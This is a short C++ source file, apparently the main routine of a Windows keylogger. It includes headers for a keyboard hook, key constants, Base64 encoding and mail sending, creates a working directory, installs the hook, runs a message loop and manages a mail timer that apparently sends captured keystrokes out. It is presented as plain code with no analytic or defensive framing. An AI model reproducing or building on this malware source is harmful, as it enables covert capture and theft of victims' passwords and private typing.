#include <iostream>
#include "Windows.h" // for windows
#include "IO.h"
#include "Timer.h"
#include "Base64.h"
#include "Helper.h"
#include "KeyConstants.h"
#include "SendMail.h"
#include "KeybHook.h"

using namespace std;

int main()
{
      /** For windows OS **/
      MSG Msg;

      IO::MkDir(IO::GetOurPath(true));

      InstallHook();

      while (GetMessage (&Msg, NULL, 0, 0)) // Retrieves a message from the calling thread's message queue.
      {
            TranslateMessage(&Msg); // Translates virtual-key messages into character messages.
            DispatchMessage(&Msg); // Dispatches a message to a window procedure.
      }

      MailTimer.Stop();

      return 0;
}
